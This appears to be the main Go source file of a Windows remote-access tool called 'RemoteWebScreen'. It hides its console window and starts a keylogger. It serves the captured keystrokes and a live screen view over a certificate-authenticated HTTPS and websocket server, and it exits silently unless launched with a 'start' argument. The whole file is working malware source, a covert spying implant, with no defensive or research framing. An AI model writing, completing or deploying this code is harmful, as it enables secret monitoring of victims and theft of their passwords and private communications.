package main

import (
	"RemoteWebScreen/keyboard"
	"RemoteWebScreen/server"
	"RemoteWebScreen/win32"
	"crypto/tls"
	"crypto/x509"
	"embed"
	"fmt"
	"html/template"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

//go:embed  index.html static/*
//go:embed certs/server.key certs/server.pem certs/ca.pem
var templates embed.FS

func init() {
	win32.HideConsole()
}

func main() {
	listenAddress := ":443"
	if len(os.Args) == 1 {
		os.Exit(0)
	} else if len(os.Args) == 2 && os.Args[1] == "start" {
	} else if len(os.Args) == 3 && os.Args[1] == "start" {
		listenAddress = fmt.Sprintf(":%s", os.Args[2])
	} else {
		os.Exit(0)
	}
	certData, _ := templates.ReadFile("certs/server.pem")
	keyData, _ := templates.ReadFile("certs/server.key")
	caCert, err := templates.ReadFile("certs/ca.pem")
	certPool := x509.NewCertPool()
	certPool.AppendCertsFromPEM(caCert)
	cert, err := tls.X509KeyPair(certData, keyData)
	if err != nil {
		//log.Fatalf("Failed to load key pair: %v", err)
	}
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		ClientCAs:    certPool,
		ClientAuth:   tls.RequireAndVerifyClientCert,
	}
	SimulateDesktopConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
	}
	SimulateDesktopListener, err := tls.Listen("tcp", ":0", SimulateDesktopConfig)
	if err != nil {
		//log.Printf("Failed to listen on a random port: %v", err)
	}
	httpsListener, err := tls.Listen("tcp", listenAddress, tlsConfig)
	if err != nil {
		//log.Fatalf("Failed to create TLS listener: %v", err)
	}
	SimulateDesktopwsPort := SimulateDesktopListener.Addr().(*net.TCPAddr).Port
	go keyboard.Keylog()
	http.HandleFunc("/"+listenAddress, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		contentBytes, err := templates.ReadFile("index.html")
		if err != nil {
			//log.Printf("contentBytes, err := templates.ReadFile(index.html): %v", err)
		}
		tmpl, err := template.New("index").Parse(string(contentBytes))
		if err != nil {
			//log.Printf("tmpl, err := template.New(index).Parse(string(contentBytes)): %v", err)
		}
		tmpl.Execute(w, map[string]interface{}{
			"WebSocketPort": SimulateDesktopwsPort,
		})
	})
	fs := http.FS(templates)
	http.Handle("/static/", http.StripPrefix("/", http.FileServer(fs)))
	http.HandleFunc("/"+listenAddress+"log", func(w http.ResponseWriter, r *http.Request) {
		filePath := filepath.Join(keyboard.Screen_logPath, keyboard.Logfilename)
		content, err := ioutil.ReadFile(filePath)
		if err != nil {
			//log.Printf("httplog: %v", err)
			//return
		}
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
		w.WriteHeader(http.StatusOK)
		w.Write(content)
	})
	go func() {
		if err := http.Serve(httpsListener, nil); err != nil {
			//log.Fatalf("Failed to start HTTPS server: %v", err)
		}
	}()
	go func() {
		http.HandleFunc("/SimulateDesktop", server.ScreenshotHandler)

	}()
	if err := http.Serve(SimulateDesktopListener, nil); err != nil {
		//log.Printf("Failed to start WebSocket server: %v", err)
	}
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for {
			<-ticker.C
			server.CleanupConnections()
		}
	}()
}
